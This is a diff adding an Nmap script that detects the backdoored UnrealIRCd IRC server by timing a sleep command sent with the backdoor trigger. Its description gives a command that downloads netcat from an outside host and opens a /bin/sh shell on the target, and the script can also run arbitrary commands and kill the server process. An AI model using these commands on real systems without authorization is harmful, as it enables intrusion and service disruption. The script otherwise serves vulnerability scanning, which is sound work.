@@ -1,0 +1,189 @@
+description = [[
+Checks if an IRC server is backdoored by running a time-based command (ping)
+and checking how long it takes to respond. 
+
+The script-arg <code>irc-unrealircd-backdoor.command</code> can be used to 
+run an arbitrary command on the remote system. Because of the nature of
+this vulnerability -- the output is never returned -- we have no way of
+getting the output of the command. It can, however, be used to start a
+netcat listener as demonstrated here:
+<code>
+  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
+  $ ncat -vv localhost 4444
+  Ncat: Version 5.30BETA1 ( http://nmap.org/ncat )
+  Ncat: Connected to 127.0.0.1:4444.
+  pwd
+  /home/ron/downloads/Unreal3.2-bad
+  whoami
+  ron
+</code>
+
+Metasploit can also be used to exploit this vulnerability. 
+
+In addition to running arbitrary commands, the
+<code>irc-unrealircd-backdoor.kill</code> script-arg can be passed, which
+simply kills the UnrealIRCd process. 
+
+
+Reference:
+http://seclists.org/fulldisclosure/2010/Jun/277
+http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt
+http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor
+]]
+
+---
+-- @args irc-unrealircd-backdoor.command An arbitrary command to run on the remote system (note, however, that you won't see the output of your command). This will always be attempted, even if the host isn't vulnerable. The pattern %IP% will be replaced with the ip address of the target host. 
+-- @args irc-unrealircd-backdoor.kill If set to '1' or 'true', kill the backdoored UnrealIRCd running. 
+-- @args irc-unrealircd-backdoor.wait Wait time in seconds before executing the check. This is recommended to set for more reliable check (100 is good value). 
+--
+-- @output
+-- PORT     STATE SERVICE
+-- 6667/tcp open  irc
+-- |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+-- 
+
+author = "Vlatko Kosturjak and Ron Bowes"
+license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+categories = {"vuln", "safe"}
+
+require "shortport"
+require "comm"
+require "stdnse"
+
+portrule = shortport.port_or_service({6666,6667,6697,6679,8067},{"irc","ircs"})
+mutex = nmap.mutex(nmap)
+
+
+action = function(host, port)
+	local socket = nmap.new_socket()
+	local code, message
+	local status, err
+	local data = ""
+	local delay = 25
+	local timeout = 35000
+
+	-- If the command takes (delay - delay_fudge) or more seconds, the server is vulnerable.
+	-- I defined the furdge as 1 second, for now, just because of rounding issues. In practice,
+	-- the actual delay should never be shorter than the given delay, only longer. 
+	local delay_fudge = 1
+
+	-- The 'AB' sequence triggers the backdoor to run a command. 
+	local trigger = "AB"
+
+	-- We define a highly unique variable as a type of 'ping' -- it lets us see when our
+	-- command returns. Typically, asynchronous data will be received after the initial
+	-- connection -- this lets us ignore that extra data. 
+	local unique = "SOMETHINGUNIQUE"
+
+	-- On Linux, do a simple sleep command. 
+	local command_linux = "sleep " .. delay
+
+	-- Set up an extra command, if the user requested one
+	local command_extra = ""
+	if(nmap.registry.args['irc-unrealircd-backdoor.command']) then
+		command_extra = nmap.registry.args['irc-unrealircd-backdoor.command']
+		-- Replace "%IP%" with the ip address
+		command_extra = string.gsub(command_extra, '%%IP%%', host.ip)
+	end
+
+	-- Windows, unfortunately, doesn't have a sleep command. Instead, we use 'ping' to
+	-- simulate a sleep (thanks to Ed Skoudis for teaching me this one!). We always want
+	-- to add 1 to the delay because the first ping happens instantly. 
+	--
+	-- This is likely unnecessary, because the Windows version of UnrealIRCd is reportedly
+	-- not vulnerable. However, it's possible that some odd person may have compiled it
+	-- from the vulnerable sourcecode, so we check for it anyways. 
+	local command_windows = "ping -n " .. (delay + 1) .. " 127.0.0.1"
+
+	-- Put together the full command
+	local full_command = string.format("%s;%s;%s;%s;%s", trigger, unique, command_linux, command_windows, command_extra)
+
+	-- wait time: get rid of fast reconnecting annoyance
+	if(nmap.registry.args['irc-unrealircd-backdoor.wait']) then
+		local waittime = nmap.registry.args['irc-unrealircd-backdoor.wait']
+		stdnse.print_debug(1, "irc-unrealircd-backdoor: waiting for %i seconds", waittime)
+		stdnse.sleep(waittime)
+	end
+
+	-- Get a lock on the mutex (this script can't run in parallel because it requires timings)
+	mutex "lock"
+--	stdnse.print_debug(1, "irc-unrealircd-backdoor: Mutex locked")
+
+	-- Send out our command
+	stdnse.print_debug(1, "irc-unrealircd-backdoor: Sending command: %s", full_command);
+	local socket, response = comm.tryssl(host, port, full_command .. "\n", {timeout=timeout, recv_before=false})
+
+	-- Make sure the socket worked
+	if(not(socket) or not(response)) then
+		stdnse.print_debug(1, "irc-unrealircd-backdoor: Couldn't connect to remote host")
+--		stdnse.print_debug(1, "irc-unrealircd-backdoor: Freeing mutex")
+		mutex "done"
+		return nil
+	end
+
+	-- Get the current time so we can measure the delay
+	-- Note: This has to be AFTER comm.tryssl(), otherwise we run into false positives. 
+	-- See http://seclists.org/nmap-dev/2010/q2/923
+	local time = os.time(os.date('*t'))
+
+	-- Accumulate the response in the 'data' string
+	data = data .. response
+	while(not(string.find(data, unique))) do
+--io.write("Response: " .. response)
+		status, response = socket:receive()
+
+		if(status) then
+			-- Keep adding to the 'data' string
+			data = data .. response
+		else
+			-- If the server unexpectedly closes the connection, it is usually related to throttling.
+			-- Therefore, we print a throttling warning. 
+			stdnse.print_debug(1, "irc-unrealircd-backdoor: Receive failed: %s", response)
+			socket:close()
+--			stdnse.print_debug(1, "irc-unrealircd-backdoor: Freeing mutex")
+			mutex "done"
+			return "Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again)."
+		end
+	end
+
+	-- Free the mutex so other scripts can get going
+--	stdnse.print_debug(1, "irc-unrealircd-backdoor: Freeing mutex")
+	mutex "done"
+
+	-- Determine the elapsed time
+	local elapsed = os.time(os.date('*t')) - time
+
+	-- Let the user know that everything's working
+	stdnse.print_debug(1, "irc-unrealircd-backdoor: Received a response to our command in " .. elapsed .. " seconds")
+
+	-- Determine whether or not the vulnerability is present
+	if(elapsed > (delay - delay_fudge)) then
+		-- Check if the user wants to kill the server.
+		if(nmap.registry.args['irc-unrealircd-backdoor.kill']) then
+			stdnse.print_debug(1, "irc-unrealircd-backdoor: Attempting to kill the Trojanned UnrealIRCd server...")
+
+			local linux_kill = "kill `ps -e | grep ircd | awk '{ print $1 }'`"
+			local windows_kill = 'wmic process where "name like \'%ircd%\'" delete'
+			local kill_command = string.format("%s||%s||%s", trigger, linux_kill, windows_kill)
+
+			-- Kill the process
+			stdnse.print_debug(1, "Running kill command: %s", kill_command)
+			socket:send(kill_command .. "\n")
+		end
+
+		stdnse.print_debug(1, "irc-unrealircd-backdoor: Looks like the Trojanned unrealircd is running!")
+
+		-- Close the socket
+		socket:close()
+
+		return "Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277"
+	end
+
+	-- Close the socket
+	socket:close()
+
+	stdnse.print_debug(1, "irc-unrealircd-backdoor: The Trojanned version of unrealircd probably isn't running.")
+
+	return nil
+end
+
